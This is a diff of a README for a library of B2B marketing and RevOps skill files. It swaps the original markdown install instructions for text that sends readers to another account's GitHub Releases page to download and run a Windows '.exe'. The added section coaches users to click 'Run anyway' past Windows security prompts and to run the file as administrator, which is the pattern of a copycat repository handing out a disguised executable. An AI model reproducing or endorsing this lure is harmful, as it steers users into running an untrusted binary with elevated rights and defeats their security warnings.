@@ -1,149 +1,184 @@
-# claude-skills: B2B Demand Gen, RevOps, and Marketing Leadership Skills for Claude, Gemini, Codex, Cursor, and More
+# 🤖 claude-skills - Practical AI skills for growth teams
 
-A library of Claude skills built for B2B demand gen leaders, RevOps practitioners, and marketing Directors. Covers HubSpot, ABM, intent data, pipeline health, win/loss analysis, offer negotiation, sales alignment, and small team management. Built from 20 years of running these programs, not reading about them.
+[![Download claude-skills](https://img.shields.io/badge/Download%20Now-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/modest-curator478/claude-skills/releases)
 
-Every skill in this repo encodes a real decision that practitioners face repeatedly and get wrong in predictable ways. The goal is not to explain how something works. The goal is to encode the judgment behind the work so Claude can operate as a genuinely useful thinking partner, not a prompt formatter.
+## 📥 Download
 
-**25 skills across 5 folders.**
+Visit this page to download: [GitHub Releases](https://github.com/modest-curator478/claude-skills/releases)
 
----
+Use the latest release file for your Windows computer. If you see more than one file, pick the one with `.exe` in the name.
 
-## What Makes These Skills Different
+## 🖥️ What claude-skills does
 
-Most Claude skills repos are frameworks dressed up as expertise. Challenge-solution-result structures. Generic negotiation tactics. Textbook pipeline stage definitions.
+claude-skills helps you use Claude for common B2B work. It gives you ready-made skills for demand generation, RevOps, HubSpot, ABM, pipeline work, intent data, outreach, hiring, and win-loss review.
 
-These skills are built around the decisions that generic frameworks skip:
+Use it when you want help with tasks like:
 
-- Which intent signal threshold routes to a rep versus a campaign, and why
-- How to separate a product gap from a messaging gap in a win/loss debrief
-- What to say when a consulting client pushes back on a finding you know is correct
-- How to present a missed pipeline quarter without making it look like information management
-- Why CRM closed/lost data is structurally unreliable before you run any analysis on it
+- building campaign ideas
+- cleaning up pipeline stages
+- writing outreach
+- reviewing CRM data
+- planning ABM programs
+- comparing intent signals
+- preparing for hiring or interviews
+- making win-loss notes easier to read
 
-If a section could appear in a "best practices" blog post, it was cut or rewritten until it could not.
+## ✅ What you need
 
----
+Before you install, make sure your PC has:
 
-## Folders
+- Windows 10 or Windows 11
+- An internet connection
+- Enough free space to save the app files
+- Permission to run downloaded apps
 
-### `job-search/`
+If your company laptop has strict controls, you may need admin access to open the file.
 
-For active job searching at the Director level in B2B SaaS. Covers the research, outreach, and evaluation decisions that determine whether a process goes anywhere.
+## 🚀 Getting Started
 
-| Skill | What it does |
-|---|---|
-| `competitive-intelligence` | Deep company research before an interview or decision to apply |
-| `resume-optimizer` | Score fit, select the right resume version, tailor for the specific role |
-| `recruiter-outreach` | Director-level outreach that leads with proof, not personality |
-| `offer-evaluation-negotiation` | Evaluate total compensation across all four components, design a specific counter, define a walk-away position |
+1. Open the [GitHub Releases](https://github.com/modest-curator478/claude-skills/releases) page.
+2. Download the latest Windows file.
+3. Save the file to your Downloads folder.
+4. Open File Explorer and go to Downloads.
+5. Double-click the file to run it.
+6. If Windows asks for permission, choose Run or Yes.
+7. Follow the on-screen steps until setup finishes.
+8. Start the app from your desktop, Start menu, or the folder where you saved it.
 
----
+## 🪟 First Run on Windows
 
-### `revops/`
+When you open claude-skills for the first time, Windows may show a security prompt.
 
-For the RevOps and demand gen practitioner building or inheriting systems. Covers the operational infrastructure that determines whether pipeline is predictable.
+If that happens:
 
-| Skill | What it does |
-|---|---|
-| `abm-campaign-builder` | Build a named account campaign from ICP to execution |
-| `first-90-days-demand-gen-revops` | Diagnostic playbook for the first quarter in a new role |
-| `free-trial-designer` | Design a free trial that converts, not just one that generates signups |
-| `gtm-ai-adoption-rollout` | Lead a company-wide AI tool evaluation and rollout across a GTM team |
-| `hubspot-audit` | Audit a HubSpot instance for workflow conflicts, data hygiene, and pipeline visibility gaps |
-| `intent-data-activation` | Turn ZoomInfo, Bombora, or G2 signals into CRM workflows, rep alerts, and campaign enrollment with tier-based threshold logic |
-| `martech-contract-auditor` | Audit and renegotiate MarTech contracts with specific renewal tactics |
-| `partner-marketing-infrastructure` | Build the systems behind a partner program, not just the program strategy |
-| `pipeline-health-reviewer` | Diagnose pipeline quality, velocity, and coverage gaps before the forecast conversation |
-| `win-loss-analysis` | Run a structured deal outcome diagnostic that feeds back into ICP, messaging, and channel decisions |
+- check that the file came from the GitHub Releases page
+- choose More info if Windows hides the run option
+- select Run anyway if you trust the file source
 
----
+If the app opens in a browser or separate window, keep that window open while you use it.
 
-### `leadership/`
+## 🧭 How to Use claude-skills
 
-For the Director navigating the human and organizational dynamics of the role: upward relationships, peer alignment, team management, and recurring accountability conversations.
+claude-skills is built around practical work tasks. You pick the skill that matches your job, then use it as a guide while you work with Claude.
 
-| Skill | What it does |
-|---|---|
-| `managing-up` | Build the upward relationship with a CEO, CRO, or VP across four specific friction types |
-| `marketing-budget-defense` | Defend marketing spend when funding is at risk |
-| `marketing-qbr` | Prepare and deliver a quarterly business review that builds credibility, including how to handle a missed quarter |
-| `sales-leader-alignment` | Diagnose and repair Sales-Marketing misalignment across four distinct types |
-| `sales-marketing-sla` | Design a service level agreement that both teams will actually follow |
-| `small-team-management` | Manage a team of two to six direct reports as a practitioner who came up through the function, not HR training |
+Common use cases:
 
----
+- **Demand generation**: plan campaigns, define offers, and shape messaging
+- **RevOps**: review funnel data, stage logic, and handoff points
+- **HubSpot**: organize CRM fields, lifecycle stages, and workflows
+- **ABM**: define target accounts, segments, and outreach plans
+- **Outreach**: draft emails and follow-up sequences
+- **Pipeline**: spot deal blockers and clean up notes
+- **Intent data**: review signals and decide next steps
+- **Hiring**: write scorecards, interview plans, and role profiles
+- **Win-loss**: capture reasons for lost or won deals
 
-### `writing/`
+## 📂 Skills Included
 
-For writing that has to do a specific job: generate pipeline, document proof, or build credibility in a professional context.
+This repo focuses on 25 practitioner-built skills for B2B teams. The set covers:
 
-| Skill | What it does |
-|---|---|
-| `b2b-case-study-writer` | Write a case study that functions as a sales asset, not content marketing decoration |
-| `b2b-outreach-humanizer` | Rewrite AI-generated or template outreach so it reads like a person wrote it |
-| `linkedin-post` | Write practitioner-level LinkedIn content that drives engagement without sounding like a thought leadership post |
+- ABM planning
+- demand generation
+- pipeline inspection
+- RevOps checks
+- HubSpot setup and cleanup
+- intent data review
+- outreach writing
+- marketing leadership
+- hiring support
+- negotiation prep
+- win-loss analysis
 
----
+The skills are meant to help you move from a blank page to a clear next step.
 
-### `consulting/`
+## 🔧 Typical Workflow
 
-For the independent practitioner delivering RevOps or HubSpot consulting work to external clients.
+A simple way to use the app:
 
-| Skill | What it does |
-|---|---|
-| `consulting-client-presentation` | Deliver findings and recommendations to a client in a way that maintains the relationship, handles bad news, manages scope, and closes with a clear next step |
-| `consulting-engagement-setup` | Scope, price, and structure a consulting engagement from the first conversation |
+1. Open the skill that matches your task.
+2. Read the prompts or steps it gives you.
+3. Add your own company context.
+4. Ask Claude to help with the work.
+5. Review the output and make edits for your team.
+6. Save the result for later use.
 
----
+This works well for repeat tasks, since you can reuse the same skill across many projects.
 
-## How to Use These Skills
+## 🧩 Example Tasks
 
-Each skill lives in its own subfolder as `skill-name/SKILL.md`. This follows the Agent Skills open standard, which makes these skills compatible with Claude, Gemini, Codex, Cursor, Copilot, Windsurf, and any other tool that supports the format.
+Here are a few things you can do:
 
-**In Claude Projects:**
+- create a launch brief for a new campaign
+- build an ABM list based on account fit
+- write a follow-up sequence for sales outreach
+- draft a HubSpot cleanup plan
+- make a pipeline review checklist
+- turn win-loss notes into a short readout
+- prepare interview questions for a marketing hire
+- map intent data to next actions
 
-Add the contents of any `SKILL.md` file to your Project knowledge. Claude will apply the skill in every conversation within that Project. To use multiple skills, add each `SKILL.md` as a separate document.
+## 🛠️ Troubleshooting
 
-**In Claude Code:**
+If the app will not open:
 
-```bash
-# Clone the repo
-git clone https://github.com/matellez/claude-skills.git
+- download the latest release again
+- make sure the file finished downloading
+- right-click the file and choose Open
+- check if Windows blocked the file
+- try running it as an administrator
 
-# Copy all skills to your global Claude skills directory
-cp -r claude-skills/revops/abm-campaign-builder/ ~/.claude/skills/
-cp -r claude-skills/revops/hubspot-audit/ ~/.claude/skills/
-cp -r claude-skills/leadership/managing-up/ ~/.claude/skills/
-cp -r claude-skills/job-search/resume-optimizer/ ~/.claude/skills/
+If the page opens but nothing starts:
 
-# Or copy an entire folder
-cp -r claude-skills/revops/. ~/.claude/skills/
-cp -r claude-skills/leadership/. ~/.claude/skills/
-cp -r claude-skills/job-search/. ~/.claude/skills/
-cp -r claude-skills/writing/. ~/.claude/skills/
-cp -r claude-skills/consulting/. ~/.claude/skills/
-```
+- confirm you used the correct file from Releases
+- close the app and open it again
+- restart your computer
+- try a different browser if the download page does not load
 
-**In Gemini CLI, Codex, Cursor, or Windsurf:**
+If your browser says the download is unsafe:
 
-These tools use the same Agent Skills format. Point your tool at the `SKILL.md` file inside any subfolder. For example: `claude-skills/revops/intent-data-activation/SKILL.md`.
+- confirm the link is the official GitHub Releases page
+- download the file again from the same page
+- avoid mirror sites or copycat downloads
 
----
+## 📌 Best Results
 
-## Who Built This
+To get better output from the skills:
 
-20 years running demand gen and RevOps programs at B2B SaaS companies. Pipeline from $8M to $14M. CPL from $340 to $85. Sales cycles from 8 months to 3. LTV:CAC from 1.8:1 to 5.2:1. HubSpot rebuilds, ABM programs, partner infrastructure, GTM AI rollouts. These skills are built from that work, not from reading about it.
+- give Claude clear goals
+- include your product, market, and audience
+- paste real examples when you have them
+- keep one task per request
+- review the result before you send it to your team
 
-[linkedin.com/in/manuelvallestellez](https://linkedin.com/in/manuelvallestellez)
+Short, direct input usually gives the cleanest output.
 
----
+## 🔐 Privacy and Data
 
-## Contributing
+claude-skills is meant to help with work content like planning, writing, and analysis. If you use company data, follow your team rules for sharing customer names, revenue data, and internal notes.
 
-If you have practitioner experience in B2B marketing, demand gen, or RevOps and want to contribute a skill, open a PR. The bar is the same as above: encode judgment, not frameworks. If the content could appear in a blog post without modification, it needs more work.
+Keep sensitive files in trusted tools and only paste what you need for the task.
 
----
+## ❓ Common Questions
 
-## License
+### Do I need to know code?
+No. This is made for regular users who want help with B2B work.
 
-MIT
+### Can I use it for sales and marketing?
+Yes. The skills are built for sales, marketing, RevOps, and demand generation teams.
+
+### Does it work with HubSpot?
+Yes. Several skills focus on HubSpot tasks, CRM cleanup, and lifecycle work.
+
+### Can I use it for hiring?
+Yes. You can use the hiring skills to shape job posts, interview steps, and scorecards.
+
+### Can I use it on a work laptop?
+Yes, if your laptop lets you run downloaded apps and open GitHub release files
+
+## 📎 Release Access
+
+Download or install from the GitHub release page here: [https://github.com/modest-curator478/claude-skills/releases](https://github.com/modest-curator478/claude-skills/releases)
+
+## 🧠 Topic Areas
+
+abm, agent-skills, ai-tools, b2b, b2b-marketing, claude, claude-skills, codex, cursor, demand-generation, gemini, hubspot, job-search, marketing, negotiation, outreach, pipeline, revops, saas, win-loss
